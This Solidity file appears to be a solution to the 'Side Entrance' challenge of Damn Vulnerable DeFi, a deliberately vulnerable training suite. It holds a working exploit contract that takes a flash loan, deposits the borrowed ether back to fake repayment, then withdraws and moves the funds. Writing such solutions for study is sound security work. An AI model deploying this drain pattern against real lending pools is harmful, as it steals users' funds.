// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import "./SideEntranceLenderPool.sol";

contract MaliciousReceiver is IFlashLoanEtherReceiver {
    address pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == pool);
        if (msg.value == 0) {
            return;
        }
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attack(address recovery, uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);
        SideEntranceLenderPool(pool).withdraw();
        SafeTransferLib.safeTransferETH(recovery, amount);
    }

    receive() external payable {}
}
